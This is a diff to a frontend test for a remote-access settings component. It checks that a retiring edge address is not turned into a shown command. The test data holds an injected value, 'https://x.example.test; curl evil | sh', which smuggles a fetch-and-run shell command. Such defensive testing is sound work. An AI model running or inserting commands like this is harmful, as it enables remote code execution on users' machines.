@@ -197,7 +197,8 @@ describe('a retiring or retired edge address', () => {
     seed('super_admin', { ...claimed, notice: { state: 'retiring', replacement: 'https://x.example.test; curl evil | sh' } })
     render(<RemoteAccessSection client={api()} />)
     const callout = screen.getByRole('status')
-    expect(within(callout).getByText(/is not a plain https address, so no command is shown: https:\/\/x\.example\.test; curl evil \| sh\. Confirm the new address with whoever runs the edge\./)).toBeTruthy()
+    expect(callout.textContent).toContain('The edge names a new address that is not a plain https address, so no command is shown: ' +
+      'https://x.example.test; curl evil | sh. Confirm the new address with whoever runs the edge.')
     expect(within(callout).queryByText(/cloudfield-server/)).toBeNull()
   })
 
